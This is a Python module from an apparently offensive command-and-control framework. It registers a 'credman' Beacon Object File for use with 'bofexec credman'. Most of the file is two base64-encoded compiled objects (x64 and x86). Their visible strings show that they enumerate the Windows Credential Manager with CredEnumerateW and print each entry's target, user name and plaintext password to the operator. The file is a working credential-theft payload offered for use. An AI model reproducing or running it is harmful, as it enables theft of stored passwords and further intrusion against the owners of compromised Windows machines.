import base64
from typing import List

# BOF imports
from core.gunnershell.bofs.base import Bof, register

from colorama import Style, Fore
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
reset = Style.RESET_ALL

@register("credman")
class CredManBof(Bof):
	base64bof: str = "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"
	x86base64bof: str = "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"

	def help_menu():
		menu = """
credman — enumerate Windows Credential Manager items

USAGE
  bofexec credman
"""
		print(brightgreen + menu + reset)
		return